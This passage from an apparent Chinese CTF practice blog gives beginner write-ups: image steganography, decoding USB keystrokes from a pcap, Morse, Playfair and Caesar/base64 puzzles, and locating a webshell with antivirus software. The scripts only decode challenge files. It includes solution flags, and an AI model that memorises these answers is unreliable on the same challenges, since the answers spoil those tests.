loading="lazy"><br>就可以打开图片了。<br>然后使用stegsolve打开，在blue的最低位发现了一个二维码，扫描得到<br><code>ci&#123;v3erf_0tygidv2_fc0&#125;</code><br>然后看另一个文件，foremost或者binwalk分离得到一个流量包<br>得到<code>key.pcap</code>然后使用kali中的工具将keyboard data保存到file。<br>命令：<code>tshark -r key.pcap -T fields -e usb.capdata &gt; usbdata.txt</code><br>然后进行提取信息（使用python脚本，呃呃呃菜狗不会写，只能求助度娘）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;output :\n&#x27;</span> + output</span><br></pre></td></tr></table></figure><p>我吐了，搜的脚本都不管用，<br><img src="https://img-blog.csdnimg.cn/20200716161801900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>？？？？？output什么都没有，要不就是报错。表示无语=_=<br>改了快一个小时了，🈚🐔8️⃣🐟<br>key直接百度找了是<code>KEYXINAN</code><br>维吉尼亚解密：密码是XINAN<br><img src="https://img-blog.csdnimg.cn/20200716162614203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就是栅栏密码<br><img src="https://img-blog.csdnimg.cn/20200716162717758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>简单的Misc已经做得差不多了，以后写难度中等一点的，慢慢提升。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF刷题记录————第五周</title>
      <link href="/2020/08/23/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%94%E5%91%A8/"/>
      <url>/2020/08/23/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%94%E5%91%A8/</url>
      
        <content type="html"><![CDATA[<p>前言：题目是做了之后的复现，所以没有顺序。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="佛系青年"><a href="#佛系青年" class="headerlink" title="佛系青年"></a>佛系青年</h2><p>与佛论禅解密网站直接解。之前还不能用来着，不知道怎么就突然好了，又可以用了。<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a></p><h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>盲文对照，得到一窜字符<code>kmdonowg</code><br>解开压缩包，得到音频，听过后发现是摩尔斯电码，可以放在audacity查看。百度很多了，不想再多做一份了。<br>第二种方法，推荐一个好网站<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html?tdsourcetag=s_pcqq_aiomsg">在线解密摩尔斯电码</a><br><img src="https://img-blog.csdnimg.cn/20200411213245425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="梅花香之苦寒来"><a href="#梅花香之苦寒来" class="headerlink" title="梅花香之苦寒来"></a>梅花香之苦寒来</h2><p>属性，分离，都没有发现有效信息，放010Editor看看。看到不一样的地方。<br><img src="https://img-blog.csdnimg.cn/20200411214057322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到很熟悉的一道题，上周刚做过，只是当时学长给我们弄得简单了点。<br>那就还是Notepad++转换成坐标，再进行画图，<br><img src="https://img-blog.csdnimg.cn/20200411215038917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这里再写一遍，我想试试扫描工具QR<br><img src="https://img-blog.csdnimg.cn/20200411215156830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>的确好用，哈哈。</p><h2 id="神奇的二维码"><a href="#神奇的二维码" class="headerlink" title="神奇的二维码"></a>神奇的二维码</h2><p>好用就再找个题玩玩<br><img src="https://img-blog.csdnimg.cn/2020041121591115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>？？？是不是试试就知道了。算了，我智障。<br>备注没有信息，foremost没有分出来任何东西。奇怪了。<br>可是在010Editor明明看到了有flag的word文档啊。<br><img src="https://img-blog.csdnimg.cn/20200411221704680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看过大佬的wp，发现还是提取，不过用binwalk就行，真奇怪<br><img src="https://img-blog.csdnimg.cn/20200411222654318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>成功提取到<br><img src="https://img-blog.csdnimg.cn/20200411223111929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>encode.txt那个base64解码得到<code>asdfghjkl1234567890</code>,可以解开一个压缩包，得到图片。表情包留下啦。哈哈。<br>再base64解密那个word文档。得到<code>comEON_YOuAreSOSoS0great</code>，耐心点，解好多遍才得到这个。<br>解开得到一个MP3文件，听出来是摩尔斯电码。在线解码。<br><img src="https://img-blog.csdnimg.cn/20200411224523666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>flag就是M O R S E I S V E R Y V E R Y E A S Y<br>呃呃呃，大写好像不行，要小写。</p><h2 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h2><p><img src="https://img-blog.csdnimg.cn/20200411224955983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个刷新键，原本我不知道是F5来着，前几天刚好帮别人看了个作业就知道这个刷新键了。所以容易想到F5隐写<br>但是这个我没找到密码，所以直接试试<br>解出来是乱码，还是要密码。回头看压缩包中有没有信息，也没有。<br>好像忽略了一个东西。还有个文件夹呢，那个刚开始里面图片打不开我就没管它了，可能在这里面。<br>实在找不到了，，就看大佬的wp了。偷偷瞟一眼。<br>服啦，一直在走弯道。的确是没密码的，只是，，，，<br><img src="https://img-blog.csdnimg.cn/20200411230817470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>压缩包的文件头。害，没想到。<br>继续做， 打开发现还有加密，应该是伪加密，看一下，改了。<br><img src="https://img-blog.csdnimg.cn/20200411231059298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>呜呜呜，看到了。又了解到一种新姿势。</p><h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><p><img src="https://img-blog.csdnimg.cn/20200411232807446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>下载后看到后缀是pcapng，应该是流量分析的题。<br>打开后，直接追踪流0，<br><img src="https://img-blog.csdnimg.cn/20200411233035359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到了账号密码。串在一起，MD5解密。这个网站有点抽风。害。<br><img src="https://img-blog.csdnimg.cn/20200411232713832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h2><p>流量分析题，这道题做了一个多小时，做出来哈哈。反正就是做出来了。贼棒。流量分析追踪流发现这个，<br><img src="https://img-blog.csdnimg.cn/20200412005807510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>有压缩包。那就分离一下，foremost分离得到压缩包。有密码。首先查看不是伪加密，那就还有密码。在到处看信息无果后，还是接着追踪信息流。<br>流7<br>发现了这么一大片十六进制的数字，开头还是FFD8，这样应该是jpg图片。<br><img src="https://img-blog.csdnimg.cn/20200412005202847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>那就复制下来放HxD里。<br><img src="https://img-blog.csdnimg.cn/20200412010338956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>保存为jpg图片。<br>得到密码<br><img src="https://img-blog.csdnimg.cn/20200412010521214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>得到flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="世上无难事"><a href="#世上无难事" class="headerlink" title="世上无难事"></a>世上无难事</h2><p><img src="https://img-blog.csdnimg.cn/2020041317523769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>密文非常乱，看不出来什么，看提示，<code>毫无规律</code>、<code>还原成通顺的语句</code>。<br>想到替换密码，在线网站解密，爆破<br><img src="https://img-blog.csdnimg.cn/20200413175546296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>题中说key就是密码，直接交，但是不对。原本思路是32位，试了下MD5解密。无果。再看题，才发现了<code>小写字母</code>所以，试着把key中的大写字母改为小写字母。提交正确。</p><h2 id="Cipher"><a href="#Cipher" class="headerlink" title="Cipher"></a>Cipher</h2><p><img src="https://img-blog.csdnimg.cn/20200413175902986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个没见过。不会，所以找一下别的师傅的wp，了解到一个新密码。<br><code>playfair</code>密码：普莱费尔密码（英文：Playfair cipher 或 Playfair square）是一种使用一个关键词方格来加密字符对的加密法，1854年由一位名叫查尔斯·惠斯通（Charles Wheatstone）的英国人发明。<br>算法：它依据一个5*5的正方形组成的密码表来编写，密码表里排列有25个字母。如果一种语言字母超过25个，可以去掉使用频率最少的一个。如，法语一般去掉w或k，德语则是把i和j合起来当成一个字母看待。英语中z使用最少，可以去掉它。<br>了解到这一步就行。有在线解密网站的。直接解密就可<br><img src="https://img-blog.csdnimg.cn/20200413184708870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>不过解出来flag不对，跟那个师傅解出来的不一样，不知道为什么，我就试试人工智能解密法（手动）<br><img src="https://img-blog.csdnimg.cn/20200414074251741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>呃呃呃，横向纵向其实一样。但是我解出来也是这么个结果。<br>我对照其他博主写的刷题记录，答案这个不一样。不一样的地方在第三对和第八对还有第十一对。<br>百度百科</p><blockquote><p>1 若p1 p2在同一行，对应密文c1 c2分别是紧靠p1 p2 右端的字母。其中第一列被看做是最后一列的右方。如，按照前表，ct对应dc<br>2 若p1 p2在同一列，对应密文c1 c2分别是紧靠p1 p2 下方的字母。其中第一行被看做是最后一行的下方。<br>3 若p1 p2不在同一行，不在同一列，则c1 c2是由p1 p2确定的矩形的其他两角的字母（至于横向替换还是纵向替换要事先约好，或自行尝试）。如，按照前表，wh对应ku或uk。</p></blockquote><p>如果想要得出那样的答案。那么他是在同一行中向左看了一位，而不是向右。同一列中向上偏了一位。实则应该向下。<br>放弃这个答案。</p><h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h2><p><img src="https://img-blog.csdnimg.cn/20200414082104419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>bugku的一道题，做的时候，没想到是摩尔斯密码。当时就是各种进制转换。所以从一开始就错了，以至于没有解出。<br>看了其他师傅的wp，才知道是摩尔斯密码。<br><img src="https://img-blog.csdnimg.cn/20200414082943682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>在线解密网站可解，解出答案后，大写全换成小写。</p><h2 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h2><p>bugku的一道密码学的题。<br>看到之后，我能想到的几种密码，都过了一遍，不过好像没有匹配的。证明不是单个密码，这个时候再想是不是套密码了，再看看还是不会。看师傅们的博客去，瞄一眼，偷偷的。<br>原来是base64和凯撒。‘AA’很像‘==’这也行啊。好家伙，学到许多。<br>但是，大佬们都写的脚本。最近在学PHP，把要学python的事情落下了。基础是学的差不多了，要好好学怎么写脚本啦。先用下大佬的脚本，看看是怎么写的。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">strs = <span class="string">&quot;e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA&quot;</span>;</span><br><span class="line">offset = ord(<span class="string">&#x27;A&#x27;</span>)-ord(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">print(offset)</span><br><span class="line">list_str=[]</span><br><span class="line"><span class="keyword">for</span> i,ch <span class="keyword">in</span> enumerate(strs):</span><br><span class="line">    c = chr(ord(ch)<span class="number">-4</span>)</span><br><span class="line">    list_str.append(c)</span><br><span class="line"></span><br><span class="line">base64_str = <span class="string">&quot;&quot;</span>.join(list_str)</span><br><span class="line">plain_text = base64.b64decode(base64_str)</span><br><span class="line">print(plain_text)</span><br></pre></td></tr></table></figure><p>先移位，变成base64编码，再进行解码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key&#123;68743000650173230e4a58ee153c68e8&#125;</span><br></pre></td></tr></table></figure><p>原本是上周的，现在才写完。罪过罪过。又懒了！</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记————第三周</title>
      <link href="/2020/08/23/CTF%E5%88%B7%E9%A2%98%E7%AC%AC%E4%B8%89%E5%91%A8/"/>
      <url>/2020/08/23/CTF%E5%88%B7%E9%A2%98%E7%AC%AC%E4%B8%89%E5%91%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p><img src="https://img-blog.csdnimg.cn/20200329164919118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开发现是个java写的小程序好像，看了一脸懵*。<br><img src="https://img-blog.csdnimg.cn/20200329165132111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>完全没搞懂咋玩，也不会动。一点思路都没有。<br>看wp，提到了一个java反编译的工具。没见过这种题。没见过就要记下来嘛，而且我最喜欢的就是玩这种我不知道的工具，又可以收一个。<br>jd-gui，这个工具，下载链接<a href="https://pan.baidu.com/s/1kmVFz964CP-xvMKznbolIw">jd-gui</a>提取码<code>9ggk</code><br>下载后不用解压，我分享的是文件夹。直接打开工具用（无需安装）<br>简单粗暴的方法就是直接把那个java小程序直接拖进去<br><img src="https://img-blog.csdnimg.cn/20200329165929619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到flag了，看着是base64 ，所以解下码在提交就对了。大吉大利，今晚吃鸡。</p><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>这个好大一个压缩包，刚开始做看到webshell还以为是要蚁剑连接，结果根本就不是，又了解到一种方式，记录一下。因为不清楚这题是干什么的，然后就去查查，结果发现直接用杀毒软件查杀就行了。服辣。。。这也行？？<br><img src="https://img-blog.csdnimg.cn/20200331080214625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后打开指定路径就找到了。害。<br><img src="https://img-blog.csdnimg.cn/20200331080704576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>还有一道题，叫做后门查杀，跟这道题一样。</p><h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p><img src="https://img-blog.csdnimg.cn/20200331123158565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开后发现是张图片，然后就很自然的foremost分离了。<br><img src="https://img-blog.csdnimg.cn/20200331123351755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>别说还真有东西，真分离出来了一张，但是死活找不到接下来的思路了，改高度、宽度。都试过了，全都不行。实在没办法，就找了wp结果我服辣。就直接搜索文本flag就能出来。¬_¬。来看我的<br><img src="https://img-blog.csdnimg.cn/20200331123841500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我TM直接疑惑。(→_→)，再仔细看看wp，他们好像没有分离图片，？？？我也试试。然后还是找不到。¯(°_o)/¯，我全删了重新来了一遍。<br>(￣┰￣*)(￣┰￣*)(￣┰￣*)(→_→)这题我无语。无能为力。<br><img src="https://img-blog.csdnimg.cn/20200331124158199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>啥也不是。</p><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p><img src="https://img-blog.csdnimg.cn/20200331195839903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到题捕捉信息，四位数。猜测可能是让破解压缩包密码。<br>然后打开就是这样的，<br><img src="https://img-blog.csdnimg.cn/20200331200118978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后解压看到了奇怪的东西。<br><img src="https://img-blog.csdnimg.cn/20200331200246683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" 